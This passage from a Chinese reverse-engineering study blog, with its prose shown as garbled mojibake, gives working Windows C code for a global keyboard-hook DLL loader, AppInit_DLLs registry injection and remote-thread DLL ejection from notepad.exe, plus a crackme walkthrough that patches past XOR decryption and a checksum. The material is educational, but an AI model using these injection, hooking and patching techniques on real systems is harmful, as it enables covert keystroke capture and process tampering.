class="line">            UnhookWindowsHookEx(g_hHook);</span><br><span class="line">            g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>MainHook.cpp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_DLL_NAME<span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTART<span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTOP<span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULEhDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTARTHookStart = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOPHookStop = <span class="literal">NULL</span>;</span><br><span class="line">    hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–å¯¼å‡ºå‡½æ•°åœ°å€</span></span><br><span class="line">    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStart(%p)\n &quot;</span>, HookStart);</span><br><span class="line">    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStop(%p)\n &quot;</span>, HookStop);</span><br><span class="line">    HookStart();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mortypress &#x27;q&#x27; to quit!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">    <span class="comment">// åœæ­¢å‹¾å–</span></span><br><span class="line">    HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¸è½½KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ³¨å†Œè¡¨æ³¨å…¥"><a href="#æ³¨å†Œè¡¨æ³¨å…¥" class="headerlink" title="æ³¨å†Œè¡¨æ³¨å…¥"></a>æ³¨å†Œè¡¨æ³¨å…¥</h2><p>ä¸‹é¢è·¯å¾„çš„AppInit_DLLsè®¾ç½®ä¸ºè¦æ³¨å…¥çš„DLLçš„è·¯å¾„å¹¶ä¸”å°†LoadAppInit_DLLsçš„å€¼æ”¹æˆ1ï¼Œå½“ç¨‹åºé‡å¯çš„æ—¶å€™ï¼Œæ‰€æœ‰åŠ è½½user32.dllçš„è¿›ç¨‹éƒ½ä¼šæ ¹æ®AppInit_Dllsä¸­çš„DLLè·¯å¾„åŠ è½½æŒ‡å®šçš„DLL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨dllé‡ŒåŠ ä¸ªåˆ¤æ–­åªæ³¨å…¥æƒ³æ³¨å…¥çš„è¿›ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )//æ£€ç´¢åŒ…å«æŒ‡å®šæ¨¡å—çš„æ–‡ä»¶çš„å®Œå…¨é™å®šè·¯å¾„ã€‚ æ¨¡å—å¿…é¡»ç”±å½“å‰è¿›ç¨‹åŠ è½½ã€‚</span><br><span class="line">           break;</span><br><span class="line">  </span><br><span class="line">       if( !(p = _tcsrchr(szPath, &#x27;\\&#x27;)) )// strrchrå‡½æ•°æŸ¥æ‰¾ str ä¸­çš„ cï¼ˆå·²è½¬æ¢ä¸º charï¼‰æœ«æ¬¡å‡ºç°ä½ç½®ã€‚ æœç´¢åŒ…æ‹¬ç»ˆæ­¢ NULL å­—ç¬¦</span><br><span class="line">           break;</span><br><span class="line"></span><br><span class="line">       if( _tcsicmp(p+1, &quot;æƒ³æ³¨å…¥è¿›ç¨‹åå­—&quot;) )</span><br><span class="line">           break;</span><br></pre></td></tr></table></figure><h2 id="DLLå¸è½½"><a href="#DLLå¸è½½" class="headerlink" title="DLLå¸è½½"></a>DLLå¸è½½</h2><ul><li>CreateToolhelp32Snapshotå»æ‹ä¸€ä¸ª<strong>TH32CS_SNAPALL</strong>å‚æ•°çš„ç³»ç»Ÿå¿«ç…§</li><li>Process32Firstå’ŒNEXTé€šè¿‡PROCESSENTRY32ç»“æ„ä½“çš„szExeFileæ¥æ¯”è¾ƒæ‰¾åˆ°notepad</li><li>CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)è¿›ç¨‹çš„æ‰€æœ‰æ¨¡å—å¿«ç…§æ‰¾åˆ°dllåŠ è½½åŸºå€ å³dllå¥æŸ„</li><li>åé¢å’ŒåŠ è½½ä¸€æ ·ï¼Œåˆ›å»ºè¿œç¨‹çº¿ç¨‹FreeLibraryæ‰åº“</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROC_NAME    (<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME    (<span class="string">L&quot;hack.dll&quot;</span>)</span></span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span> &#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ç³»ç»Ÿå¿«ç…§</span></span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾è¿›ç¨‹</span></span><br><span class="line">    Process32First(hSnapShot, &amp;pe);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123;</span><br><span class="line">            dwPID = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapShot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span> &#123;</span><br><span class="line">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwPID = notepad è¿›ç¨‹id</span></span><br><span class="line">    <span class="comment">// ä½¿ç”¨TH32CS_SNAPMODULE å‚æ•°ï¼Œè·å–åŠ è½½åˆ°notepad è¿›ç¨‹dllçš„åç§°</span></span><br><span class="line">    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<span class="comment">//å¥æŸ„</span></span><br><span class="line"></span><br><span class="line">    bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))<span class="comment">//å¾ªç¯æ¯”è¾ƒåœ°å€</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||</span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName)) &#123;</span><br><span class="line">            bFound = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//è·å–ç›®æ ‡è¿›ç¨‹çš„å¥æŸ„</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hModule = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="string">&quot;FreeLibrary&quot;</span>);<span class="comment">//è·å–FreeLibraryçš„apiåœ°å€</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        pThreadProc, me.modBaseAddr,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>);      <span class="comment">//å¸è½½dll</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    dwPID = FindProcessID(DEF_PROC_NAME);<span class="comment">//æŸ¥æ‰¾notepadçš„id    </span></span><br><span class="line">    <span class="keyword">if</span> (dwPID == <span class="number">0xFFFFFFFF</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;There is no &lt;%s&gt; process!\n&quot;</span>, DEF_PROC_NAME);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _tprintf(<span class="string">L&quot;PID of \&quot;%s\&quot; is %d\n&quot;</span>, DEF_PROC_NAME, dwPID);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (EjectDll(dwPID, DEF_DLL_NAME))</span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å†…åµŒè¡¥ä¸(Embedded patch)</title>
      <link href="/2023/05/23/embedded-patch/"/>
      <url>/2023/05/23/embedded-patch/</url>
      
        <content type="html"><![CDATA[<h1 id="å†…åµŒè¡¥ä¸-Embedded-patch"><a href="#å†…åµŒè¡¥ä¸-Embedded-patch" class="headerlink" title="å†…åµŒè¡¥ä¸(Embedded patch)"></a>å†…åµŒè¡¥ä¸(Embedded patch)</h1><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g">https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g</a><br>æå–ç ï¼š57g8</p><p>ä»å…¥å£ç‚¹å¼€å§‹è·Ÿåˆ°0040109B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040109B</span> &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040109</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040109</span>E                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    | ecx:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">004010</span>A3                | <span class="number">8033</span> <span class="number">44</span>                  | xor byte ptr ds:[ebx],<span class="number">0x44</span>                       |</span><br><span class="line"><span class="number">004010</span>A6                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      | ecx:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">004010</span>A9                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>AA                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      | ecx:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">004010</span>AD                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>A3                         |</span><br><span class="line"><span class="number">004010</span>AF                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>0                | E8 <span class="number">08000000</span>              | call &lt;unpackme#<span class="number">1.</span>ac.sub_4010BD&gt;                  |</span><br><span class="line"><span class="number">004010B</span>5                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>6                | E8 <span class="number">7</span>EFFFFFF              | call &lt;unpackme#<span class="number">1.</span>ac.sub_401039&gt;                  |</span><br><span class="line"><span class="number">004010B</span>B                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010B</span>C                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶eaxä¸º004010F5ï¼Œæ‰€ä»¥ä¼šå¯¹004010F5 - 004010F5+0x154åŒºåŸŸè¿›è¡Œä¸€æ¬¡å¼‚æˆ–è§£å¯†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x44</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿›å»<code>call &lt;unpackme#1.ac.sub_4010BD&gt;   </code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010B</span>D &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>E                | BB <span class="number">07104000</span>              | mov ebx,unpackme#<span class="number">1.</span>ac<span class="number">.401007</span>                     |</span><br><span class="line"><span class="number">004010</span>C3                | B9 <span class="number">7F</span>000000              | mov ecx,<span class="number">0x7F</span>                                     |</span><br><span class="line"><span class="number">004010</span>C8                | <span class="number">8033</span> <span class="number">07</span>                  | xor byte ptr ds:[ebx],<span class="number">0x7</span>                        |</span><br><span class="line"><span class="number">004010</span>CB                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010</span>CE                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>CF                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010</span>D2                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>C8                         |</span><br><span class="line"><span class="number">004010</span>D4                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">004010</span>D6                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    |</span><br><span class="line"><span class="number">004010</span>DB                | <span class="number">8033</span> <span class="number">11</span>                  | xor byte ptr ds:[ebx],<span class="number">0x11</span>                       |</span><br><span class="line"><span class="number">004010</span>DE                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010E1</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010E2</span>                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010E5</span>                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>DB                         |</span><br><span class="line"><span class="number">004010E7</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010E8</span>                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p>ç»§ç»­è§£å¯†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span> ^<span class="number">0x7</span></span><br><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x11</span></span><br></pre></td></tr></table></figure><p>è·Ÿè¿›å»<code>call &lt;unpackme#1.ac.sub_401039&gt;   </code></p><p><img src="/2023/05/23/embedded-patch/image-20230523155641278.png" alt="image-20230523155641278"></p><p>ä»–ä¼šå¯¹ç»è¿‡ä¸¤æ¬¡è§£å¯†åçš„004010F5 - 004010F5+0x154åŒºåŸŸä¸€æ¬¡ç§»åŠ¨ä¸€å­—èŠ‚ï¼Œä¸€æ¬¡å››ä¸ªå­—èŠ‚ï¼Œç´¯åŠ åˆ°ebxä¸­ä¸0x31EB8DB0çš„æ ¡éªŒå’Œæ¯”å¯¹ï¼Œä¸ä¸€è‡´å°±è°ƒç”¨exitprocessé€€å‡ºè¿›ç¨‹ï¼Œå¦åˆ™å°±è·³åˆ°</p><p>ä¸­é—´è¿˜ä¼šè°ƒç”¨0040108Aå»åšè§£å¯†40121eæ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040108</span>A &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040108B</span>                | <span class="number">56</span>                       | push esi                                         | esi:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">0040108</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040108</span>E                | <span class="number">8B</span>CE                     | mov ecx,esi                                      | esi:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">00401090</span>                | <span class="number">8033</span> <span class="number">17</span>                  | xor byte ptr ds:[ebx],<span class="number">0x17</span>                       |</span><br><span class="line"><span class="number">00401093</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">00401094</span>                | <span class="number">3B</span>D9                     | cmp ebx,ecx                                      |</span><br><span class="line"><span class="number">00401096</span>                | <span class="number">75</span> F8                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.401090</span>                         |</span><br><span class="line"><span class="number">00401098</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">00401099</span>                | <span class="number">5</span>E                       | pop esi                                          | esi:<span class="string">&quot;`æ¡¡&quot;</span></span><br><span class="line"><span class="number">0040109</span>A                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040124</span>A<span class="number">-00401280</span> ^<span class="number">0x17</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523161559913.png" alt="image-20230523161559913"></p><p>è¿™é‡Œè°ƒç”¨getmodulehadleè¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œè¿™ä¸ªå¥æŸ„å€¼å…¶å®å°±æ˜¯æ¨¡å—åŠ è½½çš„è™šæ‹Ÿå†…å­˜çš„åŸºåœ°å€ï¼Œä¹‹å‰å­¦win32æ—¶ä¸€ç›´ä¸çŸ¥é“è¿™ä¸ªå¥æŸ„å…·ä½“å€¼ã€‚ã€‚ã€‚</p><p>DialogBoxParamAçš„ç¬¬å››ä¸ªå‚æ•°lpDialogFuncå°±æ˜¯ç”¨æ¥å¤„ç†å¯¹è¯æ¡†æ¶ˆæ¯çš„å›è°ƒå‡½æ•°å³ä¸º004010F5</p><p><img src="/2023/05/23/embedded-patch/image-20230523164357610.png" alt="image-20230523164357610"></p><p>å‘ç°ä»£ç æ®µé‡Œæºæ‚ç€æ•°æ®åŒºï¼Œä¼°è®¡è¿™ç¨‹åºæ˜¯ç”¨çº¯æ±‡ç¼–å†™çš„ï¼Œåæ­£æˆ‘ä¸çŸ¥é“è¿˜æœ‰ä»€ä¹ˆå…¶ä»–æ–¹æ³•å¯ä»¥è¿™æ ·æºæ‚(è¿˜æ˜¯å¤ªèœäº†ï¼‰</p><h2 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h2><p>è¿™ä¸ªæ—¶å€™å…¶å®å¯ä»¥å»æ”¹æ‰åŠ å¯†çš„å­—ç¬¦ä¸²æ•°æ®ä¸ºæˆ‘ä»¬æƒ³è¦çš„ï¼Œç„¶åå»æ”¹æ‰æ ¡éªŒå’Œçš„ç¡¬ç¼–ç </p><h2 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h2><p>ç”¨å†…åµŒè¡¥ä¸ï¼Œåœ¨å®Œæˆæ£€æŸ¥æ ¡éªŒå’Œï¼Œjmpåˆ°å…¥å£ç‚¹40121eä¹‹å‰ï¼Œå»åŠ«æŒåˆ°æˆ‘ä»¬çš„è¡¥ä¸ï¼Œè¡¥ä¸åšä¿®æ”¹æ“ä½œåï¼Œå†jmpåˆ°å…¥å£ç‚¹</p><p>çœ‹ä¸€ä¸‹åŒºæ®µ</p><p><img src="/2023/05/23/embedded-patch/image-20230523165512284.png" alt="image-20230523165512284"></p><p>ä»£ç æ®µæ–‡ä»¶å¤§å°0x400ï¼Œå†…å­˜å¤§å°0x280(å†…å­˜å¯¹é½åä¸€èˆ¬ä¼šå˜ä¸º0x1000)</p><p>æœ‰ç©ºä½™éƒ¨åˆ†ä¾›æˆ‘ä»¬å†™è¡¥ä¸ä»£ç ï¼Œ</p><p>ç›´æ¥ç”¨ä¼šæ±‡ç¼–æŠŠæ•°æ®æ”¹äº†å°±è¡Œ</p><p><img src="/2023/05/23/embedded-patch/image-20230523172707047.png" alt="image-20230523172707047"></p><p>åœ¨å»æ”¹ä¸‹jmpåˆ°è¡¥ä¸çš„åœ°æ–¹</p><p><img src="/2023/05/23/embedded-patch/image-20230523173024075.png" alt="image-20230523173024075"></p><p>æ”¹æ‰</p><p><img src="/2023/05/23/embedded-patch/image-20230523173139510.png" alt="image-20230523173139510"></p><p>ä½†æ˜¯è¿™é‡Œæ˜¯è¦ç»è¿‡åŠ å¯†çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span>(<span class="number">40</span> <span class="number">1086</span>) ^<span class="number">0x7</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">0xE9</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0xee&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x05</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x2&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x02</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x5&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523173624190.png" alt="image-20230523173624190"></p><p>patchä¿å­˜ä¸€ä¸‹å°±å¥½äº†ï¼Œok</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>:(</title>
      <link href="/2023/05/20/2023-5-20/"/>
      <url>/2023/05/20/2023-5-20/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab9f1a9f344177f8385ebc49cb1adc07442e32ba7cfa4859c51e580c8d862a8e">9437a95e56b24d5da67ff8d3ebbb0d56afa721ffb68934a5c51890a2a491300a58e92e6b56af2ebbdbc377deaa212bf9f157fcdcb5f4708b51a0612cd90096b21938562bd6bed84efb729fa4caf50f4b22f4337db4d1a1ccf2407aa706ccc01ea6504f9dea05278d222f874195aaf36a7443cc68ee81a3c21a9defe11fb506c0c7278a7ed98f7635a3788bbb8c3898f3ce546f15c95a711bbd018bd326ca3fc39a93408c11a2318d2afb338395d57ad645b3d661f8525d43673647c669c3ef2adc24ef6cfdb95f079f38dc6ad09048e922413cead40aada33355b05b868be0bb584f4a5419acd51f70f1eb76b49f52594579523351512c0666c95b74de82140c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PEæ–‡ä»¶è§£æ(PE File Parsing)</title>
      <link href="/2023/05/19/PE-FILE/"/>
      <url>/2023/05/19/PE-FILE/</url>
      
        <content type="html"><![CDATA[<h1 id="PE-Portable-Executable-File-Parsing"><a href="#PE-Portable-Executable-File-Parsing" class="headerlink" title="PE(Portable Executable) File Parsing"></a>PE(Portable Executable) File Parsing</h1><p>WIN32 PEæ–‡ä»¶è§£æ</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ">https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ</a><br>æå–ç ï¼š4veh</p><ul><li>RVAï¼šRelative Virtual Addressï¼ˆç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼‰ã€‚RVA æ˜¯æŒ‡ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åœ°å€åç§»é‡ï¼Œåœ¨å†…å­˜ä¸­å®šä½ç‰¹å®šæ•°æ®çš„åœ°å€ã€‚</li><li>RAWï¼šRaw Dataï¼ˆåŸå§‹æ•°æ®ï¼‰ã€‚RAW æ˜¯æŒ‡ PE æ–‡ä»¶ä¸­æœªç»ä»»ä½•å¤„ç†æˆ–å‹ç¼©çš„åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼Œå®ƒç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–ï¼Œä¾‹å¦‚èŠ‚çš„åŸå§‹æ•°æ®ã€‚æœ‰çš„ä¹Ÿå«FOA(file offset address)</li></ul><p><img src="/2023/05/19/PE-FILE/image-20230518235342704.png" alt="image-20230518235342704"></p><h2 id="PEå¤´"><a href="#PEå¤´" class="headerlink" title="PEå¤´"></a>PEå¤´</h2><h3 id="DOSå¤´"><a href="#DOSå¤´" class="headerlink" title="DOSå¤´"></a>DOSå¤´</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in 